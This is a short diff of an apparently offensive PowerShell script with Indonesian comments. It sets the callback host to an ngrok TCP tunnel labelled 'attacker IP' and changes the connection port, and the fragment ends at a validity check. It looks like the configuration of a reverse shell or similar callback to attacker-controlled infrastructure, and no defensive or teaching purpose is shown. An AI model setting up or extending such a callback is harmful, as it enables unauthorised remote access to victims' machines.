@@ -1,6 +1,6 @@
 # Tentukan IP dan Port yang digunakan secara langsung
 $l = "0.tcp.ap.ngrok.io"  # IP Penyerang
-$p = 17809             # Port untuk koneksi
+$p = 16176             # Port untuk koneksi
 
 # Pastikan IP dan Port valid
 if (-not $l -or -not $p) {
